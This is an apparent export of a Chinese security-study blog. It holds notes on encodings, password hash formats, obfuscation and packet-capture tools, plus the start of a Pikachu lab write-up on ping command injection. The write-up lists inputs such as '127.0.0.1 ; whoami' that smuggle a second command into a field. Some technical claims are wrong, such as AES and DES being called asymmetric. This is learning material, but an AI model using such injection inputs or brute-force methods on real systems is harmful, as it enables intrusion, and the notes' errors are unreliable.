class="variable">$eb64_cry</span>), <span class="variable">$decrypted</span>, <span class="variable">$public_key</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$return_de</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>(<span class="string">&#x27;解密失败,请检查RSA秘钥&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;RSA公钥解密数据:&quot;</span>.<span class="variable">$decrypted</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>请假-001</title>
      <link href="/2023/03/28/Holiday-001/"/>
      <url>/2023/03/28/Holiday-001/</url>
      
        <content type="html"><![CDATA[<p>详情见下文</p><span id="more"></span><p>今天上了一整天的课程，搞得有些没时间学其他的了。<br>工作重点：</p><ul><li>新博客主题<ul><li>完成新主题博客的搭建，美化</li><li>新博客评论区暂未解决(耗时数小时仍然出现显示上的问题)</li><li>新博客的日志页面不尽如人意。简单来说，就是美化不好，纯色和MD文本风格达不到预期的效果。</li><li>最终决定：新主题博客暂且搁置。</li></ul></li><li>补充日志<ul><li>昨天的日志内容依然未学习完毕，隧继续斟酌，做好补充工作。</li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> leave </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0012</title>
      <link href="/2023/03/27/SEC-Study-0012/"/>
      <url>/2023/03/27/SEC-Study-0012/</url>
      
        <content type="html"><![CDATA[<p>基础</p><span id="more"></span><h1 id="算法分析-amp-传输加密-amp-数据格式-amp-密文存储-amp-代码混淆-amp-逆向保护"><a href="#算法分析-amp-传输加密-amp-数据格式-amp-密文存储-amp-代码混淆-amp-逆向保护" class="headerlink" title="算法分析&amp;传输加密&amp;数据格式&amp;密文存储&amp;代码混淆&amp;逆向保护"></a>算法分析&amp;传输加密&amp;数据格式&amp;密文存储&amp;代码混淆&amp;逆向保护</h1><p><strong>安全测试</strong> ：</p><ul><li>网站方面，会进行数据增删改提交进行测试 <strong>(数据格式的正确性)</strong> 。</li></ul><h2 id="简要说明："><a href="#简要说明：" class="headerlink" title="简要说明："></a>简要说明：</h2><h3 id="密码传输加密："><a href="#密码传输加密：" class="headerlink" title="密码传输加密："></a>密码传输加密：</h3><ul><li>MD5 SHA1 NTLM AES DES RC4<ul><li>MD5值是32或16位位由数字”0-9”和字母”a-f”所组成的字符串</li><li>SHA1这种加密的密文特征跟MD5差不多，只不过位数是40</li><li>NTLM这种加密是Windows的哈希密码，标准通讯安全协议</li><li>AES,DES,RC4这些都是非对称性加密算法，引入密钥，密文特征与Base64类似<br>应用场景：各类应用密文，自定义算法，代码分析，CTF安全比赛等</li></ul></li></ul><h3 id="传输数据加密："><a href="#传输数据加密：" class="headerlink" title="传输数据加密："></a>传输数据加密：</h3><ul><li>BASE64 URL HEX ASCII<ul><li>BASE64值是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,结尾通常有符号=</li><li>URL编码是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,通常以%数字字母间隔</li><li>HEX编码是计算机中数据的一种表示方法,将数据进行十六进制转换,它由0-9,A-F,组成</li><li>ASCII编码是将128个字符进行进制数来表示,常见ASCII码表大小规则：0<del>9&lt;A</del>Z&lt;a~z</li></ul></li></ul><h3 id="传输数据-编码型-amp-加密型等"><a href="#传输数据-编码型-amp-加密型等" class="headerlink" title="传输数据-编码型&amp;加密型等"></a>传输数据-编码型&amp;加密型等</h3><p>例：</p><ul><li>某视频</li><li>某Web站</li><li>博客登录</li><li>APP-斗地主</li></ul><p><strong>数据编码解码</strong> ：</p><ul><li>服务端与客户端编码解码一致性<ul><li>数据发送前，对数据进行了编码；服务器接收到数据时，对数据进行解码后在进行下一步操作。</li></ul></li><li>测试时，需要对Payload进行对应的加密或者编码进行提交<ul><li>在测试时，必须对Payload(攻击语句)传输的数据进行对应的编码，服务器才能接受攻击测试，否则服务器将无法接受测试语句，语句无效。</li></ul></li></ul><p>加密类型：base64,md5</p><p>影响：漏洞探针<br>应用：很多，而且可以给自己开发的代码加版权+加密等。</p><h2 id="传输格式-常规-amp-JSON-amp-XML等"><a href="#传输格式-常规-amp-JSON-amp-XML等" class="headerlink" title="传输格式-常规&amp;JSON&amp;XML等"></a>传输格式-常规&amp;JSON&amp;XML等</h2><p>格式类型：json,xml,常规……</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">数组格式：？</span><br><span class="line">列表格式：带键值对</span><br><span class="line"></span><br><span class="line">admin=xxxx&amp;&amp;passwd=xxxx  =&gt;加密或者不加密的横排格式</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  btnPost:<span class="string">&quot;xxxx&quot;</span>;</span><br><span class="line">  username:<span class="string">&quot;xxxx&quot;</span>;</span><br><span class="line">  passwd:<span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line">  savedate:1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">不能修改网站自身的加密于与格式。</span><br></pre></td></tr></table></figure><p>例：</p><ul><li>App-期H</li><li>APP-斗地主</li></ul><p>影响：发送漏洞探针,回显数据分析</p><h2 id="密码存储-Web-amp-系统-amp-三方应用"><a href="#密码存储-Web-amp-系统-amp-三方应用" class="headerlink" title="密码存储-Web&amp;系统&amp;三方应用"></a>密码存储-Web&amp;系统&amp;三方应用</h2><p>例：</p><ul><li>ZZZCMS&amp;Dz</li><li>Win&amp;Linux</li><li>MSSQL&amp;MYSQL</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ZZZCMS使用MD5加密：</span><br><span class="line">php支持<span class="number">5.0</span></span><br><span class="line">username: admin</span><br><span class="line">password: <span class="number">123456</span></span><br><span class="line">password-md5加密:e10adc3949ba59abbe56e057f20f883e</span><br><span class="line">型如：<span class="title function_ invoke__">md5</span>(<span class="number">123456</span>)=密文</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Dz3.<span class="number">2</span>(老牌博客网站)</span><br><span class="line">php支持<span class="number">5.4</span></span><br><span class="line">username: admin</span><br><span class="line">password: <span class="number">123456</span></span><br><span class="line">password-md5加密: </span><br><span class="line">型如：<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="number">123456</span>).salt)=密文</span><br><span class="line">md5加密: </span><br><span class="line"><span class="number">3510300</span>a3be24daf27ff9afdfe3323cd:<span class="number">34</span>fdbf ==&gt;可以直接丢到下面的md5解密网站解密。</span><br><span class="line">被加密的文本：<span class="number">3510300</span>a3be24daf27ff9afdfe3323cd</span><br><span class="line">密钥：<span class="number">34</span>fdbf</span><br><span class="line">密文和密钥被分开放置，例如不同的列。</span><br><span class="line"></span><br><span class="line">Dz3.<span class="number">5</span>(最新一版)--复杂加密</span><br><span class="line">username: admin</span><br><span class="line">password: <span class="number">123456</span></span><br><span class="line">加密密码的方式更加复杂。</span><br><span class="line"><span class="number">6</span>df04a92f53ca7cefee3b546a4e27b06</span><br><span class="line"></span><br><span class="line"><span class="comment">// 做测试时：</span></span><br><span class="line"><span class="comment">// 密文拿到测不出密文真实的值=&gt;没得测=&gt;该方向嗝屁~</span></span><br><span class="line"></span><br><span class="line">加密算法破解：需要满足一定的条件才能破解=&gt;有的算法需要的参数不是<span class="number">1</span>个</span><br><span class="line">md5：不可逆向的算法。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密算法种类:</span></span><br><span class="line">加密算法(常见网站的，数据库的，操作系统的)，自定义算法</span><br><span class="line"></span><br><span class="line">$解密的方式</span><br><span class="line">-- 碰撞解密(大部分的解密方式)</span><br><span class="line">  -&gt; 简单式密码可以通过碰撞式解密解出。</span><br><span class="line">  -&gt; 复杂密码可能性太多，无法碰撞解出。</span><br><span class="line">-- 不是算法的逆向的换原解密</span><br><span class="line"></span><br><span class="line">部分加密类型：</span><br><span class="line">aes, <span class="title function_ invoke__">des</span> (密钥 偏移量 填充 模式等……)</span><br></pre></td></tr></table></figure><p>网站和操作系统都有各自的加密方式，无法解出的是过渡复杂的。</p><p><a href="cmd5.com">md5加解密网站</a> ~~ <a href="http://tool.chacuo.net/cryptdes">其他加密网站</a></p><p><strong>影响</strong> ：安全后渗透测试</p><h2 id="代码混淆-源代码加密-amp-逆向保护"><a href="#代码混淆-源代码加密-amp-逆向保护" class="headerlink" title="代码混淆-源代码加密&amp;逆向保护"></a>代码混淆-源代码加密&amp;逆向保护</h2><p>例：</p><ul><li>PHP&amp;JS混淆加密</li><li>EXE&amp;JAR代码保护</li></ul><p>影响：代码审计，逆向破解</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://indialms.in/wfp_login.php?r_id=1</span><br><span class="line"><span class="built_in">base64</span>编码</span><br><span class="line">username=YWRtaW4=</span><br><span class="line">https://indialms.in/wfp_login.php?r_id=MQ== 112123</span><br></pre></td></tr></table></figure><p>数据在传输的时候进行编码 为什么要了解？</p><p>对方服务器可能会在接受的时候进行解码在带入<br>如果我们还是按照原有思路 不对自己的Payload进行同样编码的话 传入过去的东西就是不认识的东西 测试无效</p><p><strong>正确</strong> ：测试的话也要进行payload同样的加密或编码进行提交</p><p>安全测试漏洞时候 通常都会进行数据的修改增加提交测试<br>以数据的正确格式发送 接受才行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">登录的数据包：</span><br><span class="line">admin 123456</span><br><span class="line"></span><br><span class="line">MD5加密</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=123456</span><br><span class="line">username=admin&amp;password=e10adc3949ba59abbe56e057f20f883e</span><br></pre></td></tr></table></figure><p>如果现在我要进行密码的破解爆破</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">字典文件：</span><br><span class="line">帐号什么都不用更改 去替换username=值即可</span><br><span class="line">密码需要进行密码算法 保证和password=值同等加密才行</span><br><span class="line"></span><br><span class="line">https://tv.sohu.com/v/dXMvMzg1MjM2NzE5LzQyNzUyODUzOC5zaHRtbA==.html</span><br><span class="line"></span><br><span class="line">开发：数组 列表</span><br><span class="line"></span><br><span class="line">btnPost=%E7%99%BB%E5%BD%95&amp;username=admin and &amp;password=e10adc3949ba59abbe56e057f20f883e&amp;savedate=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    btnPost:<span class="string">&quot;%E7%99%BB%E5%BD%95&quot;</span>；</span><br><span class="line">    username:<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    password:<span class="string">&quot;e10adc3949ba59abbe56e057f20f883e and&quot;</span>;</span><br><span class="line">    savedate:1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">json xml 常规</span><br><span class="line">x=123</span><br><span class="line"></span><br><span class="line">x=123</span><br><span class="line">&#123;</span><br><span class="line">x:123</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zzzcms admin /123456 密文利用md5加密</span><br><span class="line">md5(123456)=密文</span><br><span class="line">dz3.2 admin /123456 </span><br><span class="line">md5(md5(123456).salt)=密文</span><br><span class="line"></span><br><span class="line">dz3.5 admin / 123456</span><br><span class="line">aes des（密匙 偏移量 填充 模式等）</span><br><span class="line">$2y$10<span class="variable">$OtsSmawENczg1BLcQCEn5OdLqJC9GLiDrClwEUooNnn8b609DfJc</span>.</span><br></pre></td></tr></table></figure><ol><li>常见加密编码进制等算法解析<ol><li>MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等</li></ol></li><li>常见加密编码形式算法解析<ol><li>直接加密，带salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</li></ol></li><li>常见解密解码方式（针对）<ol><li>枚举，自定义逆向算法，可逆向</li></ol></li><li>常见加密解码算法的特性<ol><li>长度位数，字符规律，代码分析，搜索获取等</li></ol></li></ol><h2 id="本课意义"><a href="#本课意义" class="headerlink" title="本课意义"></a>本课意义</h2><p>1.了解加密编码进制在安全测试中的存在<br>2.掌握常见的加密解密编码解码进制互转的操作<br>3.了解常见的加密解密编码解密进制互转的影响</p><h2 id="识别算法编码方法"><a href="#识别算法编码方法" class="headerlink" title="识别算法编码方法"></a>识别算法编码方法</h2><p>1、看密文位数<br>2、看密文的特征（数字，字母，大小写，符号等）<br>3、看当前密文存在的地方（Web，数据库，操作系统等应用）</p><h2 id="拓展补充参考资料"><a href="#拓展补充参考资料" class="headerlink" title="拓展补充参考资料"></a>拓展补充参考资料</h2><h3 id="传输数据编码"><a href="#传输数据编码" class="headerlink" title="传输数据编码"></a>传输数据编码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">BASE64 URL HEX ASCII</span><br><span class="line">BASE64:值是由数字<span class="string">&quot;0-9&quot;</span>和字母<span class="string">&quot;a-f&quot;</span>所组成的字符串,大小写敏感,结尾通常有符号=</span><br><span class="line">URL编码:由数字<span class="string">&quot;0-9&quot;</span>和字母<span class="string">&quot;a-f&quot;</span>所组成的字符串,大小写敏感,通常以%数字字母间隔</span><br><span class="line">HEX编码:计算机中数据的一种表示方法,将数据进行十六进制转换,它由<span class="number">0</span>-<span class="number">9</span>,A-F,组成</span><br><span class="line">ASCII编码:将<span class="number">128</span>个字符进行进制数来表示,常见ASCII码表大小规则：<span class="number">0</span>~<span class="number">9</span>&lt;A~Z&lt;a~z</span><br></pre></td></tr></table></figure><h3 id="传输数据加密"><a href="#传输数据加密" class="headerlink" title="传输数据加密"></a>传输数据加密</h3><p>同密码存储加密</p><h3 id="传输数据格式"><a href="#传输数据格式" class="headerlink" title="传输数据格式"></a>传输数据格式</h3><p>常规字符串 JSON XML等</p><h3 id="密码存储加密"><a href="#密码存储加密" class="headerlink" title="密码存储加密"></a>密码存储加密</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5 SHA1 NTLM AES DES RC4</span><br><span class="line">MD5值是32或16位位由数字<span class="string">&quot;0-9&quot;</span>和字母<span class="string">&quot;a-f&quot;</span>所组成的字符串</span><br><span class="line">SHA1这种加密的密文特征跟MD5差不多，只不过位数是40</span><br><span class="line">NTLM这种加密是Windows的哈希密码，标准通讯安全协议</span><br><span class="line">AES,DES,RC4这些都是非对称性加密算法，引入密钥，密文特征与Base64类似</span><br></pre></td></tr></table></figure><h3 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">JS前端代码加密：★★★★</span><br><span class="line">JS颜文字 jother JSFUCK</span><br><span class="line">颜文字特征：一堆颜文字构成的js代码，在F12中可直接解密执行</span><br><span class="line">jother特征：只用! + ( ) [ ] &#123; &#125;这八个字符就能完成对任意字符串的编码。也可在F12中解密执行</span><br><span class="line">JSFUCK特征：与jother很像，只是少了&#123; &#125;</span><br></pre></td></tr></table></figure><h3 id="后端代码混淆"><a href="#后端代码混淆" class="headerlink" title="后端代码混淆"></a>后端代码混淆</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PHP .NET JAVA</span><br><span class="line">PHP：乱码，头部有信息</span><br><span class="line">.NET：DLL封装代码文件，加保护</span><br><span class="line">JAVA：JAR&amp;CLASS文件，，加保护</span><br><span class="line">举例：加密平台 Zend ILSpy IDEA</span><br><span class="line">应用场景：版权代码加密，开发特性，CTF比赛等</span><br><span class="line"></span><br><span class="line">特定应用-数据库密文加密：</span><br><span class="line">MYSQL MSSQL Oracle Redis等</span><br><span class="line"></span><br><span class="line">数据显示编码：</span><br><span class="line">UTF-8 GBK2312等</span><br></pre></td></tr></table></figure><h1 id="部分资源："><a href="#部分资源：" class="headerlink" title="部分资源："></a>部分资源：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://www.cmd5.com</span><br><span class="line">http://tmxk.org/jother</span><br><span class="line">http://www.jsfuck.com</span><br><span class="line">http://www.hiencode.com</span><br><span class="line">http://tool.chacuo.net/cryptaes</span><br><span class="line">https://utf-8.jp/public/aaencode.html</span><br><span class="line">https://github.com/guyoung/CaptfEncoder</span><br></pre></td></tr></table></figure><h1 id="加密解密相关资料"><a href="#加密解密相关资料" class="headerlink" title="加密解密相关资料"></a>加密解密相关资料</h1><p>1.<a href="https://mp.weixin.qq.com/s?__biz=MzAwNDcxMjI2MA==&mid=2247484455&idx=1&sn=e1b4324ddcf7d6123be30d9a5613e17b&chksm=9b26f60cac517f1a920cf3b73b3212a645aeef78882c47957b9f3c2135cb7ce051c73fe77bb2&mpshare=1&scene=23&srcid=1111auAYWmr1N0NAs9Wp2hGz&sharer_sharetime=1605145141579&sharer_shareid=5051b3eddbbe2cb698aedf9452370026#rd">30余种加密编码类型的密文特征分析</a>（建议收藏）</p><p>2.<a href="https://blog.csdn.net/qq_41638851/article/details/100526839">CTF中常见密码题解密网站总结</a>（建议收藏）</p><p>3.<a href="https://blog.csdn.net/qq_40837276/article/details/83080460">CTF密码学常见加密解密总结</a>（建议收藏）</p><h1 id="黑盒白盒"><a href="#黑盒白盒" class="headerlink" title="黑盒白盒"></a>黑盒白盒</h1><p>黑盒：看不到源代码</p><p>白盒：看得到源代码</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC学习2023版-0011</title>
      <link href="/2023/03/26/SEC-Study-0011/"/>
      <url>/2023/03/26/SEC-Study-0011/</url>
      
        <content type="html"><![CDATA[<p>基础<br>逍遥模拟器的代理设置：长按wifi设置代理。<br>ping使用ICMP协议。 找出细节之处的差别才能学好。</p><p><strong>抓包的目的</strong> ：对资产信息进行安全测试.把看不到的数据实质化，转到web上去做测试。<br><strong>封包和抓包</strong> : 封包是零散的，精确到每个操作；抓包是整体的。</p><span id="more"></span><h1 id="抓包工具配置及使用-http-https"><a href="#抓包工具配置及使用-http-https" class="headerlink" title="抓包工具配置及使用-http/https"></a>抓包工具配置及使用-http/https</h1><p>抓包的目的：</p><ul><li>安全测试，抓出来测试。</li><li>针对算法进行逆向，构造实现一些功能。</li><li>将看不见的目标转换为可以处理的目标。</li></ul><p>准备工作：<br>1、浏览器安装证书：解决本地抓HTTPS<br>2、模拟器安装证书：解决模拟器抓HTTPS</p><p>实现目的：<br>0、掌握几种抓包工具证书安装操作<br>1、掌握几种HTTP/S抓包工具的使用<br>2、学会Web,APP,小程序,PC应用等抓包<br>3、了解此课抓包是针对那些目标什么协议</p><p>限制：</p><ul><li>抓包工具协议限制为http/https</li><li>无法抓反代理软件的包。</li></ul><p>工具：</p><ul><li>抓包工具<ul><li>BurpSuite，Charles，Fiddler</li></ul></li><li>转发工具<ul><li>Proxifier</li></ul></li></ul><p>应用场景：</p><ul><li>浏览器抓包</li><li>app抓包</li><li>小程序抓包</li><li>PC应用(C/S端)</li></ul><h2 id="Fiddler"><a href="#Fiddler" class="headerlink" title="Fiddler"></a>Fiddler</h2><p><a href="https://www.telerik.com/fiddler">网址</a></p><h3 id="证书安装"><a href="#证书安装" class="headerlink" title="证书安装"></a>证书安装</h3><h4 id="逍遥模拟器证书安装"><a href="#逍遥模拟器证书安装" class="headerlink" title="逍遥模拟器证书安装"></a>逍遥模拟器证书安装</h4><p>1.保存软件的证书<br><img src="c1.jpg" alt="保存步骤"><br>2.逍遥模拟器导入证书<br><img src="c2.jpg" alt="导入"><br><img src="c3.jpg" alt="安装"></p><h4 id="浏览器证书安装"><a href="#浏览器证书安装" class="headerlink" title="浏览器证书安装"></a>浏览器证书安装</h4><p>谷歌：<br><img src="c7.jpg" alt="谷歌安装"><br>如果要卸载证书，但不知道证书的名字是什么，有一个简单的辨别方法：<br>使用二进制文件打开证书的原始文件，在里面对证书进行查看，如果看到证书名字对的上就OK了。<br>虽然方法土鳖，但实用。</p><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>是一个http协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的http通讯，设置断点，查看所有的“进出”Fiddler的数据（指cookie,html,js,css等文件）。<br>Fiddler 要比其他的网络调试器要更加简单，因为它不仅仅暴露http通讯还提供了一个用户友好的格式。<br>简单的使用：会直接抓取数据包，不需要指定什么端口。</p><p><img src="c8.jpg" alt="调试"></p><p>优点：显示有条理</p><h2 id="Charles"><a href="#Charles" class="headerlink" title="Charles"></a>Charles</h2><p><a href="https://www.charlesproxy.com/">网址</a></p><h3 id="安装证书"><a href="#安装证书" class="headerlink" title="安装证书"></a>安装证书</h3><p>步骤与上面基本一致，故补充一个与上面不同的步骤。</p><p>获取证书：</p><p><img src="c4.jpg" alt="获取"></p><h3 id="说明-1"><a href="#说明-1" class="headerlink" title="说明"></a>说明</h3><p>是一个HTTP代理服务器,HTTP监视器,反转代理服务器，当浏览器连接Charles的代理访问互联网时，Charles可以监控浏览器发送和接收的所有数据。<br>它允许一个开发者查看所有连接互联网的HTTP通信，这些包括request, response和HTTP headers （包含cookies与caching信息）。<br>同样，打开便会自动抓包。</p><p>可以作为抓包工具，也可以作为端口转发工具。</p><p>优点：实时抓取各种各样的数据包，展示有条理。<br>缺点：数据包要自己去筛选。</p><h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><p>BurpSuite更加偏向于安全测试,且仅仅支持web协议。点对点的操作数据包。</p><h3 id="安装证书-1"><a href="#安装证书-1" class="headerlink" title="安装证书"></a>安装证书</h3><p>与上面一致，补充一个获取证书的图片：</p><p><img src="c5.jpg" alt="获取"><br><img src="c6.jpg" alt="证书格式"></p><blockquote><p>安装完成证书后依然出现“你的连接不是专用链接”：</p><ol><li>证书的双重校验：安装一个bp导致证书失效。</li><li>浏览器证书安装错误：多装几个证书位(中间人+受信任)。</li></ol></blockquote><h3 id="说明-2"><a href="#说明-2" class="headerlink" title="说明"></a>说明</h3><p>是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</p><h3 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h3><p>使用burp，必须设置代理。</p><h4 id="浏览器代理设置"><a href="#浏览器代理设置" class="headerlink" title="浏览器代理设置"></a>浏览器代理设置</h4><p><img src="c10.jpg" alt="代理"><br><img src="c9.jpg" alt="代理"></p><h4 id="逍遥模拟器代理设置"><a href="#逍遥模拟器代理设置" class="headerlink" title="逍遥模拟器代理设置"></a>逍遥模拟器代理设置</h4><p><img src="c11.jpg" alt="代理"><br><img src="c12.jpg" alt="代理"></p><h3 id="代理转发设置"><a href="#代理转发设置" class="headerlink" title="代理转发设置"></a>代理转发设置</h3><p>背景：</p><ul><li>微信设置代理时，很多设置比较复杂，容易干扰到正常的设置配置，造成微信宕机。</li><li>软件没有设置代理的地方。</li></ul><p>限制：</p><ul><li>某些软件默认权限极高，代理工具无法直接获取。</li><li>有一些协议软件是抓不到的，会出现“闪包”的情况(出现一下子又消失不见了)</li><li>小应用/小程序可以抓，大应用/大程序已经把这种权限锁死了。</li><li>软件有反抓包设置导致抓包时直接中断连接</li><li>软件协议不走http/https</li></ul><h4 id="Charles端口转发至BurpSuite"><a href="#Charles端口转发至BurpSuite" class="headerlink" title="Charles端口转发至BurpSuite"></a>Charles端口转发至BurpSuite</h4><p>代理转发工具：茶杯，Proxifier。</p><p>应用场景：微信小程序抓包</p><p>说明：茶杯仅仅做一个代理转发的功能</p><p>配置方法很简单，按照下图配置完成后直接打开bp即可</p><p><img src="c13.jpg" alt="转发设置"></p><p>基于手机模拟器已经配置完代理的情况，茶杯可以直接实现端口转发，bp不需要自身配置对应模拟器的代理。</p><h4 id="Proxifier代理转发"><a href="#Proxifier代理转发" class="headerlink" title="Proxifier代理转发"></a>Proxifier代理转发</h4><p>Proxifier：专门用来做转发的工具。</p><p>配置好代理服务器和规则后就可以直接转发到burp当中。</p><p><img src="c14.jpg" alt="新建代理服务器"><br>新建规则的规则名可以在任务管理器的进程当中进行查看。<br><img src="c15.jpg" alt="新建规则"><br>最好的方式：使用浏览打开程序对应的exe文件</p><h1 id="抓包工具配置及使用-TCP-UDP等-除了http-s的其他协议-封包"><a href="#抓包工具配置及使用-TCP-UDP等-除了http-s的其他协议-封包" class="headerlink" title="抓包工具配置及使用-TCP/UDP等(除了http/s的其他协议)-封包"></a>抓包工具配置及使用-TCP/UDP等(除了http/s的其他协议)-封包</h1><p>涉及工具： Wireshark  科来网络分析  封包分析</p><p>应用场景：APP，小程序，PC应用</p><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p><a href="https://www.wireshark.org/">网址</a></p><p>说明：</p><p>是一个网络封包分析软件。网络封包分析软件的功能是截取网络封包，并尽可能显示出最为详细的网络封包资料。Wireshark使用WinPCAP作为接口，直接与网卡进行数据报文交换。使用门槛较高。不适用于新手。</p><p>功能：使用语法进行搜索。</p><h2 id="科来网络分析系统-抓不走Web协议的数据包"><a href="#科来网络分析系统-抓不走Web协议的数据包" class="headerlink" title="科来网络分析系统-抓不走Web协议的数据包"></a>科来网络分析系统-抓不走Web协议的数据包</h2><p><a href="https://www.colasoft.com.cn/">网址</a></p><p>说明：</p><p>使用门槛较低。是一款由科来软件全自主研发，并拥有全部知识产品的网络分析产品。该系统具有行业领先的专家分析技术，通过捕获并分析网络中传输的底层数据包，对网络故障、网络安全以及网络性能进行全面分析，从而快速排查网络中出现或潜在的故障、安全及性能问题。</p><p>软件视图如下：</p><p><img src="d1.jpg" alt="初始视图"><br><img src="d2.jpg" alt="网卡视图"><br>功能：</p><ul><li>应用分类筛选</li><li>应用进程筛选</li><li>网络接口IP筛选</li></ul><p>还可以把数据包打开到数据包生成器查看。</p><h2 id="WPE-amp-封包分析"><a href="#WPE-amp-封包分析" class="headerlink" title="WPE&amp;封包分析"></a>WPE&amp;封包分析</h2><p>是强大的网络封包编辑器，wpe可以 截取网络上的信息，修改封包数据，是外挂制作的常用工具。一般在安全测试中可用来调试数据通讯地址。</p><p>功能：</p><ul><li>选好对应的进程</li><li>抓通讯地址</li><li>封包发送测试–发送对应的数据包，会影响到游戏的相关行为。例如原本走5步，发个包就变成了回到原点</li><li>零散的数据包重新发送。</li><li>X产：根据需求，抓对应功能的数据包，查看对应的通讯地址，再做对应的测试等。</li></ul><h2 id="TCPDump"><a href="#TCPDump" class="headerlink" title="TCPDump"></a>TCPDump</h2><p>八成是老师最好插进来的软件，课上见都没见到……</p><p>说明：可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。</p><p><a href="https://www.cnblogs.com/111testing/p/13620931.html">教程参考这里</a></p><h1 id="app小程序应用做安全测试"><a href="#app小程序应用做安全测试" class="headerlink" title="app小程序应用做安全测试"></a>app小程序应用做安全测试</h1><h2 id="渗透测试角度"><a href="#渗透测试角度" class="headerlink" title="渗透测试角度"></a>渗透测试角度</h2><ol><li>抓包到应用的资产信息(IP/域名等)</li></ol><ul><li>ip和域名上面的服务做测试</li><li>Web web安全攻防<ul><li>端口 - 数据库 第三方软件等</li><li>其他服务攻防</li></ul></li></ul><ol start="2"><li>API接口 oss资源 - 云安全</li></ol><h2 id="逆向破解角度"><a href="#逆向破解角度" class="headerlink" title="逆向破解角度"></a>逆向破解角度</h2><ol><li>反编译源代码当中寻找资产信息 - 与渗透测试思路一致</li><li>源码中泄露的配置key - 去测试安全性</li><li>纯逆向<ul><li>代码和产品的设计逻辑安全 <ul><li>不规范的加密</li><li>可以绕过的策略</li><li>自己删除验证重新打包绕过验证等</li></ul></li></ul></li></ol><h1 id="检测防护"><a href="#检测防护" class="headerlink" title="检测防护"></a>检测防护</h1><p>小程序抓不到和APP抓不到的原因：</p><ul><li>打不开</li><li>崩溃</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
            <tag> 靶场 </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-皮卡丘靶场ping命令</title>
      <link href="/2023/03/25/SEC-tool-0003/"/>
      <url>/2023/03/25/SEC-tool-0003/</url>
      
        <content type="html"><![CDATA[<p>靶场：pikachu<br>漏洞：ping命令漏洞</p><span id="more"></span><h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><p>有一个窗口，能实现输入一个IP地址后对其进行ping操作。<br><img src="c1.jpg" alt="ping命令窗口"></p><h1 id="涉及知识"><a href="#涉及知识" class="headerlink" title="涉及知识"></a>涉及知识</h1><p>执行多条命令的方法</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">管道符：| (管道符号) ||（逻辑或） &amp;&amp;（逻辑与）  &amp;(后台任务符号)</span><br><span class="line">Windows有4种，Linux有6种</span><br><span class="line"></span><br><span class="line">Windows-&gt; | &amp; || &amp;&amp;</span><br><span class="line">|   执行时仅返回后面的值</span><br><span class="line"></span><br><span class="line">Linux-&gt;; | || &amp; &amp;&amp; ``(特有``和;)</span><br><span class="line">例子：</span><br><span class="line">ping -c 1 127.0.0.1 ; <span class="built_in">whoami</span></span><br><span class="line">ping -c 1 127.0.0.1 | <span class="built_in">whoami</span></span><br><span class="line">ping -c 1 127.0.0.1 || <span class="built_in">whoami</span></span><br><span class="line">ping -c 1 127.0.0.1 &amp; <span class="built_in">whoami</span></span><br><span 